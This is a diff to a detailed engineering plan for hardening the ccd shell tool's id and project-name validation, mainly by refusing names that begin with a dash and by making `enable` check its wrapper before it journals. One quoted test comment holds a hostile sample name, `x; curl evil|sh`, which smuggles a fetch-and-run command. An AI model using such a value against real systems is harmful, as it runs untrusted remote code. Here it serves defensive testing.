@@ -20,7 +20,7 @@
     - A hold reason that is itself a flag spelling is held verbatim, where the `--surface` arm ate it or the arity rule refused it (`hold-reason-spelling-a-flag-is-held-verbatim`, Task 4).
 - **ccd mints no dash-leading name.**
   - `_ws_project_valid` and `_ws_tmproot_id_ok` refuse a leading `-`. This is gated on Task 0's re-count on both boxes.
-  - `ccd enable`'s two-argument form validates its project before it journals anything.
+  - `ccd enable`'s two-argument form validates its wrapper (`cmd_start`'s own check) and its project before it journals or locks anything.
 - **No new id outgrows a name ccd derives from it.**
   - `_REG_ID_MAX` is derived from Task 0's census of every per-id name template, in every file that derives one, and from the coordinator's ruling on the hook's length gates (R27).
   - It caps the composed id at ws-add, start and enable, before anything is created or journaled, with one die line per site.
@@ -68,12 +68,13 @@
 **HARD BOUNDARY.** This wave edits only:
 - `ccd/ccd`. Its stamp line changes only through `bash ccd/ccrc restamp ccd/ccd`, never by hand.
 - `ccd/ccrc-doctor-checks`: one comment in `_check_pools`, line-neutral (Task 5).
-- `server/test/**`, as NEW files, plus exactly three existing files. Each is edited only where this wave inverts a pinned behaviour or makes a comment false:
+- `server/test/**`, as NEW files, plus exactly four existing files. Each is edited only where this wave inverts a pinned behaviour or makes a comment false:
   - `pool-name-parity.test.ts` (Task 5);
   - `ccd-actor-flags.test.ts`, one comment (Task 4);
-  - `ccd-workspaces.test.ts`, one comment line edited in place (Task 5).
+  - `ccd-workspaces.test.ts`, one comment line edited in place (Task 5);
+  - `ccd-project-pool.test.ts`, the one `enable` case that Task 5's wrapper check inverts (Task 5).
   
-  An existing test file outside these three that goes red is NOT edited. The worker names it by slug and STOPs for a coordinator ruling (Task 9 says when this is measured).
+  An existing test file outside these four that goes red is NOT edited. The worker names it by slug and STOPs for a coordinator ruling (Task 9 says when this is measured).
 - The spec (a new §2.9 and the §7 status cells) and the contract's new "§17 as built (path-identity W1b)" subsection (Task 12).
 - This plan's own file under `docs/superpowers/plans/`. It rides in this wave's PR and is committed as the brief directs. The worker does not edit its body.
 - The SDD ledger, `.superpowers/sdd/2026-10-12-path-identity-w1b-ccd-id-hardening/`. `.superpowers/` is gitignored, so the ledger is never committed and never appears in the diff.
@@ -167,7 +168,7 @@ R1 to R14 are the coordinator's W1b rulings, renumbered. R15 onward were **propo
   - It refines SEC5's derived 222. The ruling's purpose is that no derived name overflows, and 222 fits only the slot name.
   - It was reported to the operator and is reversible before dispatch. If the brief carries an operator reversal to 222, Task 7 builds 222, and the census rows above it become a stated residual.
   - R27 adds a further question this ruling did not see.
-- **R11 — `cmd_enable`'s two-argument form calls `_ws_project_valid`** before it journals. It refuses more than today (a departure).
+- **R11 — `cmd_enable`'s two-argument form calls `_ws_project_valid`** before it journals. It refuses more than today (a departure). Ahead of that call, the same form asks `cmd_start`'s own wrapper check with its words, `_is_valid_wrapper "$1" || die "unknown wrapper '$1' (valid: ${CCRC_ACCOUNTS[*]})"`. So an unrostered or flag-spelled wrapper leaves no `enable` row and no reap lock either (the coordinator's ruling on the first review's enable finding).
 - **R12 — The registry peek** before the collect reap lock is kept, so `registered` keeps its precedence.
 - **R13 — Item 31's wording** must hold whether or not CCR-15 wave 10 has merged.
 - **R14 — Numbers.** W1b's block is allocated when its run opens.
@@ -279,8 +280,9 @@ Every file this wave touches. Each task's own **Files** block stays the authorit
 | `server/test/ccd-session-verbs-dash-id.test.ts` (new) | 4 |
 | `server/test/ccd-actor-flags.test.ts` | 4 (the ws-hold "does NOT strip --reason" case's mutant comment, reworded; assertion unchanged) |
 | `server/test/ccd-project-dash.test.ts` (new) | 5 |
-| `server/test/pool-name-parity.test.ts` | 5 (`-lead` inverted; header, describe title, the "leading-dash ones" case title and the "ccd really creates" case rewritten) |
+| `server/test/pool-name-parity.test.ts` | 5 (`-lead` inverted, with the exact-table comment; one new `it` for the dash line; header, describe title, the "leading-dash ones" case, the "two ENDS" comment, the "ccd really creates" case and the hostile-name case's opening comment rewritten) |
 | `server/test/ccd-workspaces.test.ts` | 5 (one comment line, in place: "which `_ws_project_valid` accepts") |
+| `server/test/ccd-project-pool.test.ts` | 5 (the "leading --cross-pool on `enable`" case inverted: enable now refuses the wrapper before it journals) |
 | `server/test/ccd-ws-add-dash-id.test.ts` (new) | 6 |
 | `server/test/ccd-id-cap.test.ts` (new) | 7 |
 | `server/test/ccd-token-verbs-dot-id.test.ts` (new) | 8 |
@@ -301,15 +303,15 @@ Task 0 → 1 → 2 → 3 → 4 → 5 → 6 → 7 → 8 → 9 → 10 → 11 → 1
 | 0 Entry conditions | — | `sonnet`, medium | Proves #351 is in, re-grounds anchors, counts both boxes, and takes the name census and the consumer length gates the cap is derived from |
 | 1 `_reg_id_ok` | 0 | `sonnet`, high | Every later id check calls it; one line and a truth table |
 | 2 The token verbs' loops | 1 | `opus`, xhigh | SAFETY: the verbs that delete, and the lock a junk id creates today |
-| 3 stop | 1 | `opus`, high | The only positional-id verb that redirects; below the anchors |
-| 4 The five upper `--session` verbs | 1 | `opus`, xhigh | The live redirects (release, archive, restore), and line-neutral above the corpus |
+| 3 stop | 1, 2 | `opus`, high | The only positional-id verb that redirects; below the anchors |
+| 4 The five upper `--session` verbs | 1, 2, 3 | `opus`, xhigh | The live redirects (release, archive, restore), and line-neutral above the corpus |
 | 5 Predicates | 1, Task 0's counts | `opus`, high | R7: it must precede ws-add; it inverts pool-name-parity |
 | 6 ws-add | 5 | `opus`, high | The project's dash is refused by 5; this closes the flag spellings |
 | 7 The composed-id cap | 5, 6 | `opus`, high | Edits the same two mint sites as 5 and 6, and `cmd_start` |
-| 8 The no-dot-leading entry rule | 2, 5 | `opus`, high | Needs `_ws_tmproot_id_ok` to refuse a dash (5), or Task 2's dash rule would be lost |
+| 8 The no-dot-leading entry rule | 2, 4, 5 | `opus`, high | Needs `_ws_tmproot_id_ok` to refuse a dash (5), or Task 2's dash rule would be lost |
 | 9 The collect reap lock after a parse | 8 | `opus`, xhigh | SAFETY: changes when a permanent lock is created, and the order of answers |
 | 10 Real-binary parity | 2 to 9 | `opus`, high | Green only once every loop and predicate is in; its red run is §8's measurement |
-| 11 Comment carries | 9 | `sonnet`, medium | The same collector region as 9; line-neutral |
+| 11 Comment carries | 9, 10 | `sonnet`, medium | The same collector region as 9; line-neutral |
 | 12 Docs | 1 to 11 | `sonnet`, high | Writes what was built, and the corrections R24 names |
 | 13 Whole-branch verification and the PR | 0 to 12 | `sonnet`, high | The wave-done's `suite:` line |
 
@@ -341,7 +343,9 @@ _ws_tmproot_id_ok() { _reg_id_ok "${1-}" && [[ "${1-}" != .* ]]; }   # id -> 0 i
 **`_ws_project_valid PROJECT`** (Task 5).
 - The three body lines stay verbatim: `local LC_ALL=C`, the charset line and `[[ "$1" != .* ]] || return 1`. Line 4 is new, on its own line: `  [[ "$1" != -* ]] || return 1`.
 - The function stays line-neutral: one comment line inside its own header is folded.
-- Its three callers' die texts change in place to "…, and no LEADING dot or dash (…)".
+- Its three callers' die texts change in place to "…, and no LEADING dot or dash" (ws-add's and project-pool's keep their parenthetical reasons; cmd_start's has none).
+- Task 5 adds a fourth caller: `cmd_enable`'s two-argument form, before `_ws_expire_refuse_return`, runs `_is_valid_wrapper "$1" || die "unknown wrapper '$1' (valid: ${CCRC_ACCOUNTS[*]})"` and then `_ws_project_valid "$2" || die "invalid project '$2' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot or dash"`. Task 7 places its cap line below it.
+- `cmd_enable` (Task 5, R11). One `if [[ $# -ge 2 ]]; then … fi` block goes directly after its `local id` line and before `_ws_expire_refuse_return "$id" enable`. In order, it holds `_is_valid_wrapper "$1" || die "unknown wrapper '$1' (valid: ${CCRC_ACCOUNTS[*]})"` (`cmd_start`'s own check and literal), then `_ws_project_valid "$2" || die "invalid project '$2' — allowed chars: A-Za-z0-9 . _ -, and no LEADING dot or dash"`.
 
 **`_REG_ID_MAX=<N>`** (Task 7; directly below `_reg_id_ok`).
 - N follows the coordinator's R27 choice:
@@ -356,7 +360,8 @@ _ws_tmproot_id_ok() { _reg_id_ok "${1-}" && [[ "${1-}" != .* ]]; }   # id -> 0 i
   `id '<ID>' is <n> bytes; a new id may be at most <_REG_ID_MAX>, so that every name ccd derives from it fits the 255-byte name limit`.
 - It never dies and prints nothing. Each mint site writes its own die line (R10, R26):
   - ws-add: `_reg_id_cap "$project-$slug" || die "$_REG_ID_CAP_WHY — choose a shorter project or slug; nothing was created"`;
-  - start and enable: `_reg_id_cap "$id" || die "$_REG_ID_CAP_WHY — choose a shorter project; nothing was created"`.
+  - start: `_reg_id_cap "$id" || die "$_REG_ID_CAP_WHY — choose a shorter project; nothing was created"`;
+  - enable, on its two-argument form only (the one-argument form names an existing id): `if (( $# >= 2 )); then _reg_id_cap "$id" || die "$_REG_ID_CAP_WHY — choose a shorter project; nothing was created"; fi`.
 
 **The identity arms** (Tasks 2, 4). Each is ONE line, placed first in its `case`. The pair or the lone key goes to the residue (R17):
 ```bash
@@ -419,16 +424,16 @@ _ws_tmproot_id_ok() { _reg_id_ok "${1-}" && [[ "${1-}" != .* ]]; }   # id -> 0 i
 - **`_ws_collect_prelock ID`**: ADVISORY; it grants nothing.
   - It calls `_ws_collect_reset` first.
   - rc 0: the reap lock may be opened.
-  - rc 1: an answer is set (`REAP_VERDICT`, `REAP_DETAIL`, `_WS_COLLECT_PROBE` when unmeasured, and `_WS_COLLECT_RECORDS` whenever a listing ran), and no lock may be opened.
+  - rc 1: an answer is set (`REAP_VERDICT`, `REAP_DETAIL`, `_WS_COLLECT_PROBE` when unmeasured, and `_WS_COLLECT_RECORDS` once the records were listed), and no lock may be opened.
   - No output, no journal line, no write.
   - Its order:
     1. `_ws_collect_slug_askable "$1"`, or unmeasured `registry` with `$_WS_COLLECT_REG_WHY`.
     2. `_ws_collect_records_of`, or unmeasured `records`.
     3. Any record that parses and names ID: rc 0.
-    4. Records exist, but no record both parses and names ID: `_ws_collect_records_judge`, then rc 1.
+    4. Records exist, but no record both parses and names ID: `_ws_tmproot_witness_read` for the document (its rc ignored), then `_ws_collect_records_judge`. rc 1 with its answer, or unmeasured `records` when that judgement reads sound on its second look.
     5. No records: a witness that parses gives rc 0.
     6. A witness that does not parse gets the registry peek (R21). It gives rc 0 unless `_ws_reclaim_absent` proves `$REG/<id>.child` and `$REG/<id>.uuid` absent, AND the listing control `ctl=("$REG"/tmproot[s])` lists exactly `$REG/tmproots`, AND `_ws_slug_free "${1%-*}" "${1##*-}"` answers 0.
-    7. Otherwise `_ws_collect_witness_judge`, then rc 1.
+    7. Otherwise `_ws_collect_witness_judge`. rc 1 with its answer, or unmeasured `witness` when that judgement reads sound on its second look.
 - **The call sites:**
   - In `_ws_collect_audit_contained`, directly before `exec {lfd}>>"$REG/.reap-$id.lock"`: `_ws_collect_prelock "$id" || { _ws_collect_audit_doc "$id"; return; }`.
   - In `cmd_ws_collect`, directly before `# THE SHARED LOCK`. An unmeasured answer gives `_ws_reclaim_fail "$id" "" probe-unmeasured "$(_ws_leaf_why_line "no lock was taken, and nothing was moved or removed: ${REAP_DETAIL-}")"; return 1`. Any other answer gives `_ws_collect_refused "$id" "" "${REAP_VERDICT-}" "no lock was taken: ${REAP_DETAIL-}" "$lc_surface" "$lc_actor" "$lc_reason"; return 0`.
@@ -591,7 +596,7 @@ For each distinct template in (e4), record its file and its widest expansion in 
 - the hook nonce `compact-<ms>-<pid>-<R>-<R>` is at most 41;
 - mktemp's `XXXXXX` is 6.
 
-Record every file under `ccd/` or `server/src` that the census leaves out, with its reason. Each one is a stated residual.
+Record every file under `ccd/` or `server/src` that the census leaves out, with its reason. Each one is a stated residual. Write the whole Step 5 record (each template, file and overhead, the excluded files, the gates, W, 255 − W and the cap) as one ledger block. Its first line is `Task 0 Step 5: mint-site census`, it has no blank line inside it, and a blank line ends it: Task 7's Step 0 (i) reads it with `sed -n '/mint-site census/,/^$/p'`.
 
 For (e6), record each gate next to the census: at the export, `CCRC_ID_MAX=128` and `CCRC_PROJ_MAX=64` in `ccd/session-hook.sh`, and `REGISTRY_ID_MAX_CHARS`/`TMPROOT_ID_MAX_CHARS` if W1a has merged.
 
@@ -3168,6 +3173,7 @@ EOF
   - the "ccd really creates" case, inverted;
   - the first sentences of the hostile-name case's comment, which the inversion makes false.
 - Modify `server/test/ccd-workspaces.test.ts`. One comment line, in place: `` // `_ws_project_valid` accepts, so the verb would die at the not-a-git-repo ``.
+- Modify `server/test/ccd-project-pool.test.ts`. The one case titled "a leading --cross-pool on `enable` now journals the REAL id, because the strip runs before `_id`" is replaced whole (Step 2i). It pins the `enable` row that the wrapper check removes.
 - Create `server/test/ccd-project-dash.test.ts`.
 
 **Interfaces:**
@@ -3676,10 +3682,36 @@ After:
     // run against the shipped file. `x; curl evil|sh` is the doctor's own
 ```
 
+(2i) `server/test/ccd-project-pool.test.ts`: the `enable` case that the wrapper check inverts. Today it pins that `cmd_enable --cross-pool demo pool-a` journals `enable` for `demo-pool-a` before `cmd_start` refuses the unrostered wrapper `demo`. Step 4g refuses before that line. Find the case by its title, `a leading --cross-pool on \`enable\` now journals the REAL id, because the strip runs before \`_id\``. Replace the whole case, from its `it(` line through its closing `});` and its comment included, with:
+
+```ts
+  it('a leading --cross-pool on `enable` is stripped before the wrapper check, which refuses the REAL wrapper before any journal line', () => {
+    // MEASURED when `cmd_enable`'s own strip moved ABOVE `_id "$1" "$2"`: with
+    // the flag gone from argv, `_id demo pool-a` is `demo-pool-a`, never the
+    // bogus `--cross-pool-demo`.
+    //
+    // WHICH CHECK REFUSES changed in path-identity W1b (path-identity spec
+    // §2.4): `cmd_enable`'s two-argument form now asks `cmd_start`'s own
+    // wrapper check, words and all, BEFORE its `enable` line, so the refused
+    // `demo` leaves no row at all. The stderr line still proves the strip:
+    // unstripped, the wrapper would be the flag itself, and the refusal would
+    // name `--cross-pool`.
+    const r = shFail('cmd_enable --cross-pool demo pool-a');
+    expect(r.code).not.toBe(0);
+    expect(r.stderr).toContain("unknown wrapper 'demo'");
+    const lcDir = path.join(REG(), '.lifecycle');
+    const journal = fs.existsSync(lcDir)
+      ? fs.readdirSync(lcDir).map((f) => fs.readFileSync(path.join(lcDir, f), 'utf8')).join('\n')
+      : '';
+    expect(journal, 'no row for the bogus id').not.toContain('"id":"--cross-pool-demo"');
+    expect(journal, 'and none for the refused one').not.toContain('"id":"demo-pool-a"');
+  });
+```
+
 - [ ] **Step 3: Run them RED**
 
 ```bash
-cd server && ./node_modules/.bin/vitest run test/ccd-project-dash.test.ts test/pool-name-parity.test.ts
+cd server && ./node_modules/.bin/vitest run test/ccd-project-dash.test.ts test/pool-name-parity.test.ts test/ccd-project-pool.test.ts
 ```
 
 Expected: FAIL. These are drafted predictions; record the measured text in the ledger.
@@ -3697,6 +3729,7 @@ Expected: FAIL. These are drafted predictions; record the measured text in the l
   - "disagree on none": `[ '-lead' ]` against `[]`.
   - The dash-line case.
   - "ccd refuses to create": `threw` is false.
+- `ccd-project-pool.test.ts`: 1 failed, the rewritten `enable` case: `and none for the refused one: expected '…"id":"demo-pool-a"…' not to contain '"id":"demo-pool-a"'`. Today enable journals that row before `cmd_start` refuses `demo`.
 
 A different count is not a departure. A case that is GREEN here is: name it by slug and STOP.
 
@@ -3872,7 +3905,7 @@ awk '/^cmd_enable\(\) \{/{f=1} f&&/_is_valid_wrapper "\$1"/{print "wrap " NR} f&
 - [ ] **Step 8: Run them GREEN**
 
 ```bash
-cd server && ./node_modules/.bin/vitest run test/ccd-project-dash.test.ts test/pool-name-parity.test.ts test/ownership.test.ts test/mark-check.test.ts
+cd server && ./node_modules/.bin/vitest run test/ccd-project-dash.test.ts test/pool-name-parity.test.ts test/ccd-project-pool.test.ts test/ownership.test.ts test/mark-check.test.ts
 ```
 
 Expected: PASS, with 11 of 11 in `ccd-project-dash.test.ts`.
@@ -3898,8 +3931,6 @@ Expected: PASS, with 11 of 11 in `ccd-project-dash.test.ts`.
 
 In the table, `\|` is a Markdown table escape, in the mutation text and in the `-t` filters alike: type a plain `|`. Typed as `\|`, a `-t` filter matches no title, every case is skipped, and the row reads green.
 
-In the table, each `\|` is a Markdown escape. Type a plain `|`, in each `||` and in each `-t` pattern. vitest reads `-t` as a regular expression, where `\|` is a literal bar that matches no title, so a row typed with it runs nothing and reads green.
-
 After the last mutation, restore once more and re-run Step 8's command: green. Then `rm -rf "$S"`.
 
 - [ ] **Step 10: The gates (unedited files run whole; foreground, timeout at least 600000 ms)**
@@ -3922,18 +3953,18 @@ for f in _ws_project_valid cmd_ws_add cmd_project_pool; do
   echo "$f origin=$(git show origin/main:ccd/ccd | grep -n "^$f() {" | cut -d: -f1) head=$(grep -n "^$f() {" ccd/ccd | cut -d: -f1)"
 done                                                                         # origin equals head on each line
 git diff --quiet -- server/test/session-hook.test.ts && echo "census numbers unedited"
-git status --porcelain                                                       # exactly the five paths Step 11 adds
+git status --porcelain                                                       # exactly the six paths Step 11 adds
 ```
 
 Expected: every suite PASSES, and the five citation passes are green with no number edited.
 - The third command runs every caller of `_ws_tmproot_id_ok`'s suite. Its collector files are CLAUDE.md's load flakes: re-run a red file alone before calling it a break.
-- An existing file outside this task's three that goes red is NOT edited. Name it by slug and STOP for a coordinator ruling (HARD BOUNDARY).
+- An existing file outside this task's four that goes red is NOT edited. Name it by slug and STOP for a coordinator ruling (HARD BOUNDARY).
 
 - [ ] **Step 11: Commit**
 
 ```bash
 git add ccd/ccd ccd/ccrc-doctor-checks server/test/ccd-project-dash.test.ts \
-  server/test/pool-name-parity.test.ts server/test/ccd-workspaces.test.ts
+  server/test/pool-name-parity.test.ts server/test/ccd-workspaces.test.ts server/test/ccd-project-pool.test.ts
 git commit -F - <<'EOF'
 fix(ccd): no project or temp-root id begins with a dash; enable validates its project
 
@@ -3956,7 +3987,9 @@ isTmpRootId on every name but length.
 
 pool-name-parity's -lead row inverts: ccd and the doctor now refuse the same
 leading-dash names, and ccd refuses to create the tag. The doctor's comment
-and one ccd-workspaces comment line are reworded in place.
+and one ccd-workspaces comment line are reworded in place. ccd-project-pool's
+enable case inverts with the wrapper check: the stripped --cross-pool still
+leaves the real wrapper to refuse, and nothing is journaled.
 EOF
 ```
 
@@ -5546,7 +5579,7 @@ git log -1 --format=%B | grep -cE 'D-[0-9]'                               # 0
   - Restamp.
 - Create the test `server/test/ccd-collect-prelock.test.ts`.
 - Run, never edit: every `ccd-collect-*` and `ccd-ws-collect-*` file, `collect-readers`, `collect-pacing`, `wsaudit`, `ccd-wsaudit-nonpoison`, `ccd-refusal-scan`, `ccd-die-containment`, `ccd-child-reclaim-pause`, `macos-platform`, `ccdargv-dec-parity`, `ownership` and `mark-check`.
-- In the WS-AUDIT-COLLECT header, the two lines that open its THE LOCK paragraph (`# THE LOCK. Inside the population the audit takes …`), which 3f makes false: 3h. They are below every frozen anchor, so a line may be added.
+- In the WS-AUDIT-COLLECT header, the two lines that open its THE LOCK paragraph (`# THE LOCK. Inside the population the audit takes …`), which 3f makes false: 3h. They are below every frozen anchor, so lines may be added (3h adds three).
 - NOT edited: the rest of the WS-AUDIT-COLLECT header comment (Task 11 owns items 29 to 31), `_ws_collect_locked`, `server/src/**`, `shared/**`, and every existing test file (HARD BOUNDARY).
 
 **Interfaces:**
@@ -8207,7 +8240,7 @@ Expected:
 - The first command prints nothing.
 - The plans listing prints at most one path, this plan's own file, committed as the brief directs. It prints none if the brief landed the plan on `main`.
 - `DR` prints nothing.
-- `M` prints exactly `server/test/ccd-actor-flags.test.ts`, `server/test/ccd-workspaces.test.ts` and `server/test/pool-name-parity.test.ts`. Under (3e) it also prints `server/test/session-hook.test.ts`.
+- `M` prints exactly `server/test/ccd-actor-flags.test.ts`, `server/test/ccd-project-pool.test.ts`, `server/test/ccd-workspaces.test.ts` and `server/test/pool-name-parity.test.ts`. Under (3e) it also prints `server/test/session-hook.test.ts`.
 - `added tests exact`.
 - The never-edit listing prints nothing. Under (3e) it prints `server/test/session-hook.test.ts` alone.
 - `0`, because the ledger is gitignored and never committed.
@@ -8274,7 +8307,7 @@ Wave 2 of 4 of the path-identity programme (spec `docs/superpowers/specs/2026-10
 - Task 12: the spec's 2.9 and section 7 status cells; the contract's "§17 as built".
 
 ### Boundary
-`ccd/ccd` (restamped with `bash ccd/ccrc restamp ccd/ccd`); one line-neutral comment in `ccd/ccrc-doctor-checks`; thirteen new files under `server/test/`, and three existing ones edited only where a pinned behaviour inverts or a comment became false (`ccd-actor-flags`, `ccd-workspaces`, `pool-name-parity`); the spec and the contract's as-built note; this plan. No server, shared, agent, PWA or deploy source; no route, table, capability word, ccd verb, agent grant or wire field.
+`ccd/ccd` (restamped with `bash ccd/ccrc restamp ccd/ccd`); one line-neutral comment in `ccd/ccrc-doctor-checks`; thirteen new files under `server/test/`, and four existing ones edited only where a pinned behaviour inverts or a comment became false (`ccd-actor-flags`, `ccd-project-pool`, `ccd-workspaces`, `pool-name-parity`); the spec and the contract's as-built note; this plan. No server, shared, agent, PWA or deploy source; no route, table, capability word, ccd verb, agent grant or wire field.
 
 ### Suite
 - suite: {{green|red}} on the first full run after implementation: {{N_FILES}} server test files in 24 shards; agent and PWA green unchanged.
